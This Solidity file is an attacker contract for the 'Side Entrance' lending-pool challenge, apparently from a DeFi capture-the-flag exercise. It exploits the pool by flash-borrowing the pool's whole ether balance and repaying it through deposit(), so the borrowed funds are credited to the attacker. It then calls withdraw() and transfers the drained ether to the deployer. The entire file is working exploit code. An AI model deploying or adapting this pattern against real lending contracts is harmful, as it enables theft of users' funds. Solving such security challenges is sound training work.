// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiverAttacker is IFlashLoanEtherReceiver {
    address private attacker;
    SideEntranceLenderPool private target;

    constructor(address _target) {
        attacker = msg.sender;
        target = SideEntranceLenderPool(_target);
    }

    function attack() external {
        target.flashLoan(address(target).balance);
    }

    function execute() external payable {
        target.deposit{value: msg.value}();
    }

    function takeAll() external {
        target.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}
